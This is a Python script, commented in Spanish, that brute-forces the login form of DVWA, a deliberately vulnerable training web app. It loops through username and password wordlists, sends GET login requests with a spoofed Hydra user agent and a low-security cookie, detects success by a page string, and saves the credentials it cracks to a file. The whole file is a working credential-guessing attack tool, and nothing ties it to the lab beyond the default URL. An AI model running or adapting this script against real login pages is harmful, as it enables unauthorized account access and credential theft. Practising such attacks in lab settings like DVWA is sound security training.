#!/usr/bin/env python3
"""
bruteforce_dvwa.py
Brute-force simple usando requests contra DVWA (/vulnerabilities/brute/)
Uso:
    python3 bruteforce_dvwa.py --host http://127.0.0.1:8000 --users users.txt --passes passwords.txt --php PHPSESSIDVALUE -t 8
"""
import argparse
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

def try_login(session, base_url, user, passwd, php_sessid=None, timeout=8):
    """
    Realiza el intento GET (igual que el form de DVWA en low).
    Devuelve (success_bool, reason, resp_text_len)
    """
    # Construir la URL GET tal cual la vimos
    endpoint = "/vulnerabilities/brute/"
    params = {
        "username": user,
        "password": passwd,
        "Login": "Login"
    }
    headers = {
        # user-agent igual que el de hydra 
        "User-Agent": "Mozilla/5.0 (Hydra)",
        "Referer": base_url + endpoint
    }

    # Cookies: DVWA necesita security=low y PHPSESSID para que el login sea validado
    cookies = {"security": "low"}
    if php_sessid:
        cookies["PHPSESSID"] = php_sessid

    try:
        r = session.get(base_url + endpoint, params=params, headers=headers, cookies=cookies, timeout=timeout)
    except Exception as e:
        return (False, f"error: {e}", 0)

    body = r.text
    # Criterio de éxito: cadena visible en login correcto
    if "Welcome to the password protected area" in body:
        return (True, "match-success-string", len(body))
    # fallback
    return (False, "failure", len(body))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", required=True, help="URL base del DVWA, ex: http://127.0.0.1:8000")
    ap.add_argument("--users", required=True, help="Archivo con usuarios (uno por línea)")
    ap.add_argument("--passes", required=True, help="Archivo con contraseñas (uno por línea)")
    ap.add_argument("--php", default=None, help="(opcional) valor de PHPSESSID para enviar en cookie")
    ap.add_argument("-t", "--threads", type=int, default=4, help="Número de hilos concurrentes")
    ap.add_argument("-o", "--output", default="resultados_py.txt", help="Archivo de salida con credenciales válidas")
    args = ap.parse_args()

    with open(args.users, "r", encoding="utf-8") as f:
        users = [l.strip() for l in f if l.strip()]

    with open(args.passes, "r", encoding="utf-8") as f:
        passwords = [l.strip() for l in f if l.strip()]

    session = requests.Session()
    start = time.time()
    exact_found = []
    
    print(f"Iniciando brute-force contra {args.host}")
    print(f"Usuarios: {len(users)}, Contraseñas: {len(passwords)}")
    print("=" * 50)
    
    # Ejecutamos por usuario: cuando encuentra una credencial válida, pasa al siguiente usuario
    attempts = 0
    for user_idx, user in enumerate(users, 1):
        print(f"[{user_idx}/{len(users)}] Probando usuario: {user}")
        user_found = False
        
        for pw_idx, pw in enumerate(passwords, 1):
            attempts += 1
            
            # Mostrar progreso cada cierto número de intentos
            if attempts % 100 == 0:
                elapsed = time.time() - start
                print(f"  -> Intentos: {attempts}, Tiempo transcurrido: {elapsed:.1f}s")
            
            ok, reason, length = try_login(session, args.host, user, pw, args.php)
            
            if ok:
                print(f"[CREDENCIAL ENCONTRADA] {user}:{pw} ({reason}, body_len={length})")
                exact_found.append((user, pw, reason, length))
                user_found = True
                break  # Pasar al siguiente usuario
            else:
                # Mostrar progreso para el usuario actual
                if pw_idx % 50 == 0:
                    print(f"  -> Probando contraseña {pw_idx}/{len(passwords)} para {user}")
        
        if not user_found:
            print(f"No se encontró contraseña válida para {user}")
        
        print()  # Línea en blanco para separar usuarios

    elapsed = time.time() - start
    
    # Guardar resultados
    with open(args.output, "w", encoding="utf-8") as outf:
        for u, p, reason, length in exact_found:
            outf.write(f"{u}:{p}  # {reason} len={length}\n")

    print("=" * 50)
    print(f"RESUMEN FINAL:")
    print(f"Tiempo total: {elapsed:.1f}s")
    print(f"Intentos realizados: {attempts}")
    print(f"Resultados guardados en: {args.output}")
    
    if exact_found:
        print(f"\nCREDENCIALES VÁLIDAS ENCONTRADAS ({len(exact_found)}):")
        for u, p, reason, length in exact_found:
            print(f"  → {u}:{p}  ({reason}, {length} bytes)")
    else:
        print("\nNo se encontraron credenciales válidas.")

if __name__ == "__main__":
    main()